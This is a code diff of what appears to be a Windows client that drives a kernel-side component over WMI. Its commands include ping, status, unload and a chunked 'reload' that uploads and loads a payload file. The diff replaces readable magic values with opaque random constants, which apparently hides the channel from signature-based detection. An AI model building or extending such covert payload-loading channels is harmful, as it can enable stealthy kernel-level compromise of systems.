@@ -7,16 +7,16 @@
 #define WMIGUID_EXECUTE 0x0010
 #define WMI_METHOD_ID 1U
 
-#define WMI_REQUEST_MAGIC 0x00514552574D4D53ULL
-#define WMI_RESPONSE_MAGIC 0x00534552574D4D53ULL
+#define WMI_REQUEST_MAGIC 0x205491981D54CE66ULL
+#define WMI_RESPONSE_MAGIC 0xA59BF0D6049B9C38ULL
 #define WMI_REQUEST_SIZE 4096U
 #define WMI_RESPONSE_SIZE 512U
-#define WMI_COMMAND_DOORBELL 1U
-#define WMI_COMMAND_PING 2U
-#define WMI_COMMAND_STATUS 3U
-#define WMI_COMMAND_UNLOAD 4U
-#define WMI_COMMAND_STAGE_CHUNK 5U
-#define WMI_COMMAND_RELOAD 6U
+#define WMI_DOORBELL 1U
+#define WMI_PING 2U
+#define WMI_STATUS 3U
+#define WMI_UNLOAD 4U
+#define WMI_STAGE_CHUNK 5U
+#define WMI_RELOAD 6U
 #define WMI_STATUS_OK 0U
 
 typedef ULONG(WINAPI *WMI_OPEN_BLOCK)(GUID *Guid, DWORD DesiredAccess,
@@ -278,7 +278,7 @@ static int ReloadPayload(const wchar_t *PayloadPath) {
     if (Chunk > WMI_REQUEST_DATA_CAPACITY) {
       Chunk = WMI_REQUEST_DATA_CAPACITY;
     }
-    InitRequest(Request, WMI_COMMAND_STAGE_CHUNK);
+    InitRequest(Request, WMI_STAGE_CHUNK);
     Request->DataSize = Chunk;
     Request->Offset = Offset;
     Request->PayloadSize = PayloadSize;
@@ -293,7 +293,7 @@ static int ReloadPayload(const wchar_t *PayloadPath) {
     }
   }
 
-  InitRequest(Request, WMI_COMMAND_RELOAD);
+  InitRequest(Request, WMI_RELOAD);
   Request->PayloadSize = PayloadSize;
   Request->PayloadHash = Hash;
   if (!ExecuteWmi(&Client, Request, &Response)) {
@@ -313,16 +313,16 @@ Done:
 
 int wmain(int argc, wchar_t **argv) {
   if (argc == 2 && _wcsicmp(argv[1], L"doorbell") == 0) {
-    return SendSimpleCommand(WMI_COMMAND_DOORBELL);
+    return SendSimpleCommand(WMI_DOORBELL);
   }
   if (argc == 2 && _wcsicmp(argv[1], L"status") == 0) {
-    return SendSimpleCommand(WMI_COMMAND_STATUS);
+    return SendSimpleCommand(WMI_STATUS);
   }
   if (argc == 2 && _wcsicmp(argv[1], L"ping") == 0) {
-    return SendSimpleCommand(WMI_COMMAND_PING);
+    return SendSimpleCommand(WMI_PING);
   }
   if (argc == 2 && _wcsicmp(argv[1], L"unload") == 0) {
-    return SendSimpleCommand(WMI_COMMAND_UNLOAD);
+    return SendSimpleCommand(WMI_UNLOAD);
   }
   if (argc == 3 && _wcsicmp(argv[1], L"reload") == 0) {
     return ReloadPayload(argv[2]);
